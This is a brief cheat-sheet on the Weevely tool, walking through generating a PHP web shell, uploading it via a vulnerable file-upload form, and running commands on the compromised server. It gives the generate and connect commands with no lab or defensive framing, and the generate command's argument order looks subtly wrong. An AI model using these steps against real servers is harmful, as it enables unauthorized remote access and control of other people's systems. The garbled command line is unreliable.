**Weevely** permits to upload a **web shell** (usually PHP) to a target server and interact with it remotely through a web interface.
#### How It Works

1. **Generate Shell**: Use the `weevely generate` command to create a PHP web shell.
2. **Upload the Shell**: The generated shell is uploaded to the vulnerable server via file upload functionality.
3. **Access the Shell**: Access the uploaded shell via the web browser and interact with the server remotely.

#### Basic Commands

- Generate shell:
```bash
weevely generate http://<target-server>/path/to/shell.php <password> shell.php
```
- Interact with the shell:
```bash
weevely http://target.com/shell.php password
```
This will open an interactive shell session. Once connected, you’ll be able to run commands on the target server.